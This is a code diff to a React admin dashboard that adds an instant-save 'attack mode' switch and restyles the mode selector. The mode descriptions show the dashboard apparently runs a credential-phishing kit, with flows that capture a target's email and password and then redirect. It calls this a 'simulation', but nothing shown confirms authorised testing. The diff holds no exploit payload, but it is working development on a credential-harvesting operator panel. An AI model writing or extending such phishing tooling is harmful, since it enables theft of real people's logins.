@@ -139,6 +139,29 @@ export function AdminDashboard() {
         setIsUploading(false);
     }
   };
+  
+  const handleAttackModeChange = async (mode: 'auto' | 'manual' | 'semi-auto') => {
+    setValue('attackMode', mode);
+    try {
+      const res = await fetch("/api/state", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "setAttackMode", mode }),
+      });
+      if (res.ok) {
+        toast({ title: "Attack Mode Updated", description: `Switched to ${mode} mode.` });
+        fetchState();
+      } else {
+        throw new Error("Failed to switch mode");
+      }
+    } catch (error) {
+      toast({
+        variant: "destructive",
+        title: "Error",
+        description: "Could not switch attack mode.",
+      });
+    }
+  };
 
   const onConfigSubmit: SubmitHandler<ConfigFormData> = async (data) => {
     let finalData = { ...data };
@@ -452,7 +475,7 @@ export function AdminDashboard() {
                  <Card>
                     <CardHeader>
                         <CardTitle>Attack Mode</CardTitle>
-                        <CardDescription>Select the simulation mode.</CardDescription>
+                        <CardDescription>Select the simulation mode. Changes save instantly.</CardDescription>
                     </CardHeader>
                     <CardContent>
                          <Controller
@@ -460,20 +483,20 @@ export function AdminDashboard() {
                             control={control}
                             render={({ field }) => (
                                 <RadioGroup
-                                    onValueChange={field.onChange}
+                                    onValueChange={(value: 'auto' | 'manual' | 'semi-auto') => handleAttackModeChange(value)}
                                     value={field.value}
                                     className="grid grid-cols-1 gap-4"
                                 >
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary">
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Auto Mode</div>
                                            <RadioGroupItem value="auto" id="auto" />
                                         </div>
                                         <p className="text-sm text-muted-foreground">
-                                            A streamlined flow: Email &rarr; Password &rarr; Redirect. Captures initial credentials then redirects.
+                                            A streamlined flow: Email → Password → Redirect. Captures initial credentials then redirects.
                                         </p>
                                     </Label>
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary">
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Semi-Auto (Fast Catch)</div>
                                            <RadioGroupItem value="semi-auto" id="semi-auto" />
@@ -482,7 +505,7 @@ export function AdminDashboard() {
                                            A single password capture page that uses the Target Config and then redirects.
                                         </p>
                                     </Label>
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary">
                                          <div className="flex items-center justify-between w-full">
                                             <div className="font-semibold">Manual Mode</div>
                                             <RadioGroupItem value="manual" id="manual" />
@@ -553,3 +576,5 @@ export function AdminDashboard() {
     </div>
   );
 }
+
+    
